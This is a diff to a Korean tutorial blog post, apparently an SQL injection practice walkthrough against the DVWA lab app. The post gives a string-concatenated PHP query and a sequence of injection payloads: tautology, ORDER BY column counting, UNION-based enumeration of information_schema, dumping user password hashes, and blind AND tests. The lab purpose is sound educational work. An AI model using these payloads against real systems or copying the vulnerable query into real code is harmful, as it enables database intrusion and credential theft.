@@ -34,8 +34,7 @@ category : Practice
 
 <font size="4em" color="#0091ff">1. WHERE 구문을 우회하여 공격</font><br>
 
-``` SQL
-    
+``` sql    
     $id = $_REQUEST[ ‘id’ ];
 
     $query = “SELECT name, email FROM users WHERE id = ‘ $id ’;”;
@@ -49,7 +48,6 @@ category : Practice
 <font size="4em" color="#0091ff">2. UNION 구문을 이용한 공격</font><br>
 
 ``` SQL
-
     SELECT name, email FROM users WHERE ID=’1’ UNION SELECT name, pw FROM users#~~~’
 ``` 
 <br>-UNION은 합집합으로 두 SELECT 구문의 결과를 모두 포함<br>
@@ -72,7 +70,6 @@ category : Practice
 - 이렇게 ‘ 입력해서 건들러 보면 SQL 구문 에러가 발생되지요, 그리고<br>
 
 ``` SQL
-
     SELECT name, email FROM users WHERE id = ‘’’;
 ```
 
@@ -81,7 +78,6 @@ category : Practice
 -쌍이 맞이 않아 Syntax 에러 발생<br>
 
 ``` SQL
-
     1’ or ’1’=’1
 ``` 
 
@@ -95,7 +91,6 @@ category : Practice
 </font></center><br>
 
 ``` SQL
-
     1’ ORDER BY 1#
 ```
 <br>-ORDER BY 뒤의 숫자를 증가시켜 가다가 에러 발생하면 <br>
@@ -106,7 +101,6 @@ category : Practice
 </div>스샷. 4<span style="color: #FFFFFF">~~死~~</span><br>
 
 ``` SQL
-
     ‘ UNION SELECT schema_name,2 from information_schema.schemata# 
 ```
 <br>-MYSQL DB는 information_shema라는 DB에서 데이터베이스 이름,<br>
@@ -123,7 +117,6 @@ schemata 테이블로부터 shema_name을 가져오는 SQL 쿼리문을 이용�
 사용하는 DB의 이름이 dvwa임을 추측 할 수 있습니다.<br>
 
 ``` SQL
-
     ' UNION SELECT table_name,2 from information_schema.tables where table_schema='dvwa'#
 ```
 <br><div align="center" >
@@ -133,7 +126,6 @@ schemata 테이블로부터 shema_name을 가져오는 SQL 쿼리문을 이용�
 주어 dvwa DB의 테이블만 출력,guest와 users라는 테이블이 출력됨<br>
 
 ``` SQL
-
     ' UNION SELECT column_name,2 from information_schema.columns where table_schema='dvwa' and table_name='users'#
 ```
 <br><div align="center" >
@@ -142,7 +134,6 @@ schemata 테이블로부터 shema_name을 가져오는 SQL 쿼리문을 이용�
 - 사용자(users) 테이블의 칼럼 목록을 알아내는 구문과 입력 결과, user와 password 칼럼이 눈에 띄는군요<br>
 
 ``` SQL
-
     ' UNION SELECT user,password from users#
 ```
 <br><div align="center" >
@@ -169,7 +160,6 @@ admin의 surname md5 복호화 하면 password 됩니다.
 사용하고 있는지 모름<br>
 
 ``` SQL
-
     1’ AND 1=1#
 ```
 
@@ -181,7 +171,6 @@ admin의 surname md5 복호화 하면 password 됩니다.
 메시지가 출력됩니다. <br>
 
 ``` SQL
-
     1’ AND 1=2#
 ```
 
